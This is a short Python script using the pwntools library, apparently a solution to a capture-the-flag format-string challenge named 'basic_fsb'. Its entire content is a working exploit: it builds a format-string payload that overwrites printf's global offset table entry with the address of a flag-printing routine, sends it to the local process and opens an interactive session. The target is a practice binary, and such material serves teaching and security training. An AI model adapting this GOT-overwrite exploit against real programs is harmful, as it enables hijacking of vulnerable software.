from pwn import *

p = process("./basic_fsb")

offset = 2
flag = 0x80485b4
printf_got = 0x804a00c

payload = ''
payload += fmtstr_payload(offset, {printf_got:flag})
p.sendline(payload)
p.interactive()

